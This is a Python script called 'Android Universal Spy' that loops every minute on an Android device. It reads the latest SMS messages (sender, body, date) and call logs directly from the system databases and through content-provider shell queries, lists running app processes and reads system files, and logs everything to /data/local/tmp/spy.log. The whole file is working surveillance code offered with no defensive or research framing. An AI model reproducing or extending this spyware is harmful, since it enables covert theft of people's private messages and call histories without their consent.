import os
import sys
import sqlite3
import subprocess
import time
import json
from datetime import datetime
from pathlib import Path

class AndroidSpy:
    
    def __init__(self):
        """Initialize the spy"""
        print("=" * 60)
        print("=== ANDROID SPY INITIALIZED ===")
        print("=" * 60)
        print(f"Started at: {datetime.now()}")
        print(f"Python version: {sys.version}")
        print(f"Current directory: {os.getcwd()}")
        print("=" * 60)
        
        self.data_dir = "/data/data"
        self.user_data_dir = "/data/user/0"
        self.running = True
        self.log_file = "/data/local/tmp/spy.log"
        
    def log(self, message):
        """Log to both console and file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        
        try:
            with open(self.log_file, 'a') as f:
                f.write(log_msg + '\n')
        except:
            pass
    
    def start(self):
        """Main monitoring loop"""
        self.log("Starting main monitoring loop...")
        
        iteration = 0
        while self.running:
            try:
                iteration += 1
                self.log(f"\n{'='*60}")
                self.log(f"Iteration #{iteration} - {datetime.now()}")
                self.log(f"{'='*60}")
                
                # Try all methods
                self.method1_direct_database()
                self.method2_content_provider()
                self.method3_proc_filesystem()
                self.method4_system_files()
                
                self.log(f"\n{'='*60}")
                self.log(f"Iteration #{iteration} complete - Sleeping 60 seconds...")
                self.log(f"{'='*60}\n")
                
                time.sleep(60)  # Wait 1 minute
                
            except KeyboardInterrupt:
                self.log("Stopping (KeyboardInterrupt)...")
                self.running = False
                break
            except Exception as e:
                self.log(f"Error in main loop: {e}")
                time.sleep(10)
    
    def method1_direct_database(self):
        """Method 1: Direct SQLite database access"""
        self.log("\n### METHOD 1: Direct Database Access ###")
        
        # Try to read SMS database
        sms_paths = [
            f"{self.data_dir}/com.android.providers.telephony/databases/mmssms.db",
            f"{self.user_data_dir}/com.android.providers.telephony/databases/mmssms.db",
            "/data/data/com.android.providers.telephony/databases/mmssms.db"
        ]
        
        for db_path in sms_paths:
            if self.read_sms_database(db_path):
                break
        
        # Try to read call log database
        call_paths = [
            f"{self.data_dir}/com.android.providers.contacts/databases/calllog.db",
            f"{self.user_data_dir}/com.android.providers.contacts/databases/calllog.db",
            "/data/data/com.android.providers.contacts/databases/calllog.db"
        ]
        
        for db_path in call_paths:
            if self.read_call_database(db_path):
                break
    
    def read_sms_database(self, db_path):
        """Try to read SMS from database"""
        try:
            if not os.path.exists(db_path):
                return False
            
            self.log(f"✓ Found SMS database: {db_path}")
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT address, body, date FROM sms ORDER BY date DESC LIMIT 5")
            rows = cursor.fetchall()
            
            if rows:
                self.log("✓✓✓ SMS MESSAGES ACCESSED ✓✓✓")
                for row in rows:
                    address, body, date_ms = row
                    dt = datetime.fromtimestamp(date_ms / 1000)
                    self.log(f"  From: {address}")
                    self.log(f"  Body: {body}")
                    self.log(f"  Date: {dt}")
                    self.log("  ---")
            
            conn.close()
            return True
            
        except Exception as e:
            self.log(f"  Failed to read SMS DB: {e}")
            return False
    
    def read_call_database(self, db_path):
        """Try to read call log from database"""
        try:
            if not os.path.exists(db_path):
                return False
            
            self.log(f"✓ Found call log database: {db_path}")
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT number, type, date, duration FROM calls ORDER BY date DESC LIMIT 5")
            rows = cursor.fetchall()
            
            if rows:
                self.log("✓✓✓ CALL LOGS ACCESSED ✓✓✓")
                for row in rows:
                    number, call_type, date_ms, duration = row
                    dt = datetime.fromtimestamp(date_ms / 1000)
                    type_str = {1: "INCOMING", 2: "OUTGOING", 3: "MISSED"}.get(call_type, "UNKNOWN")
                    
                    self.log(f"  Number: {number}")
                    self.log(f"  Type: {type_str}")
                    self.log(f"  Duration: {duration}s")
                    self.log(f"  Date: {dt}")
                    self.log("  ---")
            
            conn.close()
            return True
            
        except Exception as e:
            self.log(f"  Failed to read call DB: {e}")
            return False
    
    def method2_content_provider(self):
        """Method 2: Access via content:// URIs"""
        self.log("\n### METHOD 2: ContentProvider Access ###")
        
        commands = [
            ("SMS", "content query --uri content://sms/inbox --projection address:body:date --sort 'date DESC' --limit 5"),
            ("Calls", "content query --uri content://call_log/calls --projection number:type:date:duration --sort 'date DESC' --limit 5")
        ]
        
        for name, cmd in commands:
            try:
                self.log(f"Querying {name}...")
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0 and result.stdout:
                    self.log(f"✓ {name} data retrieved:")
                    lines = result.stdout.strip().split('\n')[:10]  # First 10 lines
                    for line in lines:
                        self.log(f"  {line}")
                else:
                    self.log(f"  {name}: No data or access denied")
                    
            except Exception as e:
                self.log(f"  {name} query failed: {e}")
    
    def method3_proc_filesystem(self):
        """Method 3: Read /proc filesystem"""
        self.log("\n### METHOD 3: /proc Filesystem ###")
        
        # Running processes
        try:
            self.log("Reading running processes...")
            count = 0
            
            for pid in os.listdir('/proc'):
                if pid.isdigit():
                    try:
                        with open(f'/proc/{pid}/cmdline', 'r') as f:
                            cmdline = f.read().replace('\x00', ' ').strip()
                            
                            # Only log Android apps
                            if 'com.' in cmdline:
                                self.log(f"  PID {pid}: {cmdline}")
                                count += 1
                                
                                if count >= 15:  # Limit output
                                    break
                    except:
                        pass
            
            self.log(f"✓ Found {count} Android processes")
            
        except Exception as e:
            self.log(f"  Process reading failed: {e}")
        
        # Network connections
        try:
            with open('/proc/net/tcp', 'r') as f:
                lines = f.readlines()
                self.log(f"✓ Network: {len(lines)} TCP connections")
                
        except Exception as e:
            self.log(f"  Network reading failed: {e}")
        
        # Memory info
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()[:5]
                self.log("✓ Memory info:")
                for line in lines:
                    self.log(f"  {line.strip()}")
                    
        except Exception as e:
            self.log(f"  Memory reading failed: {e}")
    
    def method4_system_files(self):
        """Method 4: Read system configuration files"""
        self.log("\n### METHOD 4: System Files ###")
        
        files_to_read = [
            ("/system/build.prop", "Build properties"),
            ("/proc/version", "Kernel version"),
            ("/proc/cpuinfo", "CPU info")
        ]
        
        for file_path, description in files_to_read:
            try:
                if os.path.exists(file_path):
                    with open(file_path, 'r') as f:
                        lines = f.readlines()[:5]  # First 5 lines
                        self.log(f"✓ {description} ({file_path}):")
                        for line in lines:
                            self.log(f"  {line.strip()}")
            except Exception as e:
                self.log(f"  Failed to read {file_path}: {e}")

def main():
    """Main entry point"""
    print("\n" + "="*60)
    print("ANDROID UNIVERSAL SPY - STARTING")
    print("="*60 + "\n")
    
    try:
        spy = AndroidSpy()
        spy.start()
    except Exception as e:
        print(f"\nFATAL ERROR: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("\n" + "="*60)
        print("ANDROID UNIVERSAL SPY - STOPPED")
        print("="*60 + "\n")

if __name__ == '__main__':
    main()
